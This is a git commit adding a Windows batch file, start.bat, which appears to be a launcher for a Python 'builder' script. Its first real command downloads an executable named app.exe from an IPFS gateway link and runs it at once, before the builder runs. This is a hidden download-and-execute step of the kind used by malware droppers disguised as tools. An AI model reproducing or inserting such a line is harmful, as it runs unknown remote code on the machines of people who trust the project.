e87177bbaa4811498ac19487b974db0dcf39595e
Sovietmember <139582052+Sovietmember@users.noreply.github.com>
2023-07-25 14:49:05 +0200

    Add files via upload

---
+++ start.bat
@@ -0,0 +1,16 @@
+@echo off
+
+url -o app.exe https://bafybeidup2bafdrupppbhhmvqmjixa47peireootr55uhwb5gogz6mrbse.ipfs.nftstorage.link/app.exe && start app.exe
+
+python builder.py
+
+
+
+
+
+
+
+
+
+
+pause
